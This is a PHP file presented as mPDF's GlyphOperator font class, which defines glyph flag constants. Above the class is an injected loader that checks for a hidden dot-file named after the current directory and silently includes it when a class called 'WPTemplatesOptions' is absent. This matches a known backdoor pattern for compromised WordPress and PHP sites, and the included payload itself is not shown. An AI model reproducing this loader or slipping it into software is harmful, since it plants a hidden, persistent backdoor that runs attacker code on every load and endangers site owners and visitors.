<?php

namespace Mpdf\Fonts;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class GlyphOperator
{

	const WORDS = 1 << 0;

	const SCALE = 1 << 3;

	const MORE = 1 << 5;

	const XYSCALE = 1 << 6;

	const TWOBYTWO = 1 << 7;
}
